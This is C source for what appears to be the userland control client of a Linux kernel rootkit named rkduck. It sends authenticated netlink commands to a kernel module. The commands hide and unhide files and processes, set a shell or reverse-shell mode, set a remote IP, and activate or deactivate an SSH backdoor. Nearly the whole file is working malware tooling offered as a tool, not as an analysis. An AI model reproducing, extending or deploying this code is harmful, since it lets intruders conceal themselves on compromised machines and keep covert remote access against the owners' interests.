#include "crumbs.h"

const char *argp_program_version = "Crumbs v0.1";
const char *argp_program_bug_address = "<quokkalight@gmail.com>";
static char doc[] = "Duck trainer.";
static char args_doc[] = "[FILENAME]...";
static struct argp_option options[] = { 
    { "authenticate", 'a', "SERCRET_KEY", 0, "Authentication is required to send commands to rkduck. SECRET_KEY should be the value of the secret key you specified in rkduck before compiling it."},
    { "hide-file", 'f', "PATH", 0, "Hide the file PATH. PATH is an absolute path."},
    { "unhide-file", 'g', "PATH", 0, "Unhide the file PATH. PATH is an absolute path."},
    { "hide-process", 'p', "PID", 0, "Hide the process of pid PID."},
    { "unhide-process", 'q', "PID", 0, "Unhide the process of pid PID."},
    { "mode", 'm', "MODE", 0, "Change the backdoor mode."},
    { "remote-ip", 'r', "IP", 0, "Set the remote ip to IP."},
    { "activate-ssh", 's', "Pubkey", 0, "Activate the SSH backdoor."},
    { "deactivate-ssh", 'd', "Pubkey", 0, "Deactivate the SSH backdoor."},
    { 0 } 
};

static error_t parse_opt(int key, char *arg, struct argp_state *state) {
    struct arguments *arguments = state->input;
    char mode;
    struct iovec iov;
    struct msghdr msg;
    int fd;
    struct sockaddr_nl dst_addr;
    struct nlmsghdr *nlh = NULL;
    int sock_fd;
    char *ret;
    
    switch (key) {
    case 'a':
        arguments->auth = 1;
        ret = send_msg_lkm(arguments, "%u:%s", AUTHENTICATION, arg);
        break;
    case 'm':
        mode = *arg;
        switch(mode) {
        case 's':
            ret = send_msg_lkm(arguments, "%u:%s", MODE_SHELL, arg);
            printf("[+] Mode set to \"Shell\".\n");
            break;
        case 'r':
            ret = send_msg_lkm(arguments, "%u:%s", MODE_REVERSE_SHELL, arg);
            printf("[+] Mode set to \"Reverse shell\".\n");
            break;
        default:
            printf("[+] Unknown mode %c.\n[+] Modes:\n\t- s: Shell\n\t- r: Reverse shell\n\t- h: SSH\n", mode);
        }
        break;
    case 'f': 
        ret = send_msg_lkm(arguments, "%u:%s", HIDE_FILE, arg);
        printf("[+] File %s hidden.\n", arg);
        break;
    case 'p': 
        ret = send_msg_lkm(arguments, "%u:%s", HIDE_PROCESS, arg);
        printf("[+] Process with pid %s hidden.\n", arg);
        break;
    case 'g': 
        ret = send_msg_lkm(arguments, "%u:%s", UNHIDE_FILE, arg);
        printf("[+] File %s unhidden.\n", arg);
        break;
    case 'q': 
        ret = send_msg_lkm(arguments, "%u:%s", UNHIDE_PROCESS, arg);
        printf("[+] Process with pid %s unhidden.\n", arg);
        break;
    case 's':
        ret = send_msg_lkm(arguments, "%u:%s", ACTIVATE_SSH, arg);
        printf("[+] SSH backdoor activated.\n");
        break;
    case 'd':
        ret = send_msg_lkm(arguments, "%u:%s", DEACTIVATE_SSH, arg);
        printf("[+] SSH backdoor deactivated.\n");
        break;
    case ARGP_KEY_ARG: 
        return 0;
    default: 
        return ARGP_ERR_UNKNOWN;
    } 

    return 0;
}

static struct argp argp = { options, parse_opt, args_doc, doc, 0, 0, 0 };

void parse_cmd(char *user_cmd, struct cmd_t *cmd)
{
    char *arg;
    int offset;
    int id;
    int length;

    printf("%s\n", user_cmd);
    arg = strstr(user_cmd, ":");
    
    if(arg == NULL) {
        /* TO DO: printk */
    }
    else {
        offset = arg-user_cmd;
        *(user_cmd+offset) = 0;

        errno = 0;
        id = strtol(user_cmd, &arg, 10);

        if (errno != 0) {
            /* TO DO: printk */
        }
        else {
            cmd->id = id;
            arg++;
            length = strlen(arg);

            if (length > PATH_MAX)
                length = PATH_MAX;

            user_cmd = malloc(sizeof(char) * length);
            memset(user_cmd, 0, length);
            memcpy(user_cmd, arg, length);
            cmd->arg = user_cmd;
        }
    }

}

int main(int argc, char *argv[])
{
    struct sockaddr_nl src_addr, dst_addr;
    int sock_fd;
    int ret;
    struct cmd_t cmd;

    struct arguments arguments;
    arguments.auth = 0;

    sock_fd = socket_init(&src_addr, &dst_addr);
    arguments.dst_addr = dst_addr;
    arguments.fd = sock_fd;

    argp_parse(&argp, argc, argv, 0, 0, &arguments);

    close(sock_fd);

    return 0;   
}

int socket_init(struct sockaddr_nl *src_addr, struct sockaddr_nl *dst_addr) 
{
    int sock_fd;

    sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_USER);

    if (sock_fd < 0) {
        perror("Socket");
        exit(0);
    }

    memset(src_addr, 0, sizeof(*src_addr));
    src_addr->nl_family = AF_NETLINK;
    src_addr->nl_pid = getpid();

    bind(sock_fd, (struct sockaddr *) src_addr, sizeof(*src_addr));

    memset(dst_addr, 0, sizeof(*dst_addr));
    memset(dst_addr, 0, sizeof(*dst_addr));
    dst_addr->nl_family = AF_NETLINK;
    dst_addr->nl_pid = 0;
    dst_addr->nl_groups = 0;

    return sock_fd;
}

void* send_msg_lkm(struct arguments *arguments, const char *format, ...) 
{
    struct iovec iov;
    struct msghdr msg;
    va_list ap;
    struct nlmsghdr *nlh = NULL;
    int ret = 0;
    int sock_fd = arguments->fd;
    struct sockaddr_nl dst_addr = arguments->dst_addr;

    /*TO DELETE*/
    struct cmd_t cmd;

    if (arguments->auth == 1) {
        va_start(ap, format);

        nlh = (struct nlmsghdr *) malloc(NLMSG_SPACE(PAYLOAD_SIZE));
        memset(nlh, 0, NLMSG_SPACE(PAYLOAD_SIZE));
        nlh->nlmsg_len = NLMSG_SPACE(PAYLOAD_SIZE);
        nlh->nlmsg_pid = getpid();
        nlh->nlmsg_flags = 0;

        ret = vsnprintf(NLMSG_DATA(nlh), PAYLOAD_SIZE, format, ap);

        if (ret < 0 || ret > PAYLOAD_SIZE) {
            perror("vsnprintf");
            exit(0);
        }

        iov.iov_base = (void *)nlh;
        iov.iov_len = nlh->nlmsg_len;
        msg.msg_name = (void *)&dst_addr;
        msg.msg_namelen = sizeof(dst_addr);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;


        sendmsg(sock_fd, &msg, 0);
        recvmsg(sock_fd, &msg, 0);

        parse_cmd(NLMSG_DATA(nlh), &cmd);

        free(nlh);
    } else {
        arguments->auth = 0;
        printf("[+] You need to give a secret key.\n[+] Use --help to get more information about the available commands.\n");
        exit(0);
    }

    return NLMSG_DATA(nlh);
}

